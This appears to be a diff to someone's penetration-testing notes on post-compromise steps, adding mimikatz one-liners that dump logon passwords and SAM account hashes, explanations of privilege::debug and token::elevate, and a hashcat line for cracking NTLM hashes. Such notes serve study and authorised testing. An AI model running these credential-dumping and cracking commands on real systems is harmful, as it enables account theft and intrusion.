@@ -255,11 +255,19 @@ Post compromise of the first machine:
 
   - Get mimikatz on the first machine
     - One liner: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > passwords.txt
-    - Broken down:
-      - mimikatz.exe
-      - privilege::debug
-      - sekurlsa::logonpasswords
-      - exit
+      - Broken down:
+        - mimikatz.exe
+        - privilege::debug
+        - sekurlsa::logonpasswords
+        - exit
+    - One liner: mimikatz.exe "privilege::debug" "lsadump::sam" "exit" >
+sam_accounts.txt
+      - Broken down:
+        - privilege::debug 
+          - which enables the SeDebugPrivilge access right required to tamper with another process. I
+        - token::elevate 
+          - elevate the security token from high integrity (administrator) to SYSTEM integrity. 
+        - lsadump::sam
   - NTLM hashes: 
     - Crack NTLM hashes
       - hashcat hash.txt rockyou.txt
